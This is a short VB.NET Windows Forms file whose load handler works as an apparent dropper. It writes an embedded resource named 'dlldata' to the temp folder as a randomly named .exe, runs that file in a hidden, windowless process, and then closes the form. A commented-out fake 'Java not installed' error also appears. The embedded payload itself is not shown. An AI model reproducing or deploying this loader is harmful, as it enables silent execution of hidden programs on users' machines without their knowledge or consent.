Imports System.IO

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim ranname5 As New Random
        Dim randomname As String
        randomname = ranname5.Next(1, 10000)
        Dim path As String = Interaction.Environ("temp") + "\"
        File.WriteAllBytes(path + randomname + "dlldata.exe", My.Resources.dlldata)
        Try
            Process.Start(New ProcessStartInfo() With {.FileName = path + randomname + "dlldata.exe", .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = String.Concat(New String() {"""", Text, """""", Text, """""", Text, """""", Text, """"})}).WaitForExit()
            Me.Close()


        Catch ex As Exception
            '' MessageBox.Show("Java Not Installed or Is Not On Path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Return
        End Try
    End Sub
End Class
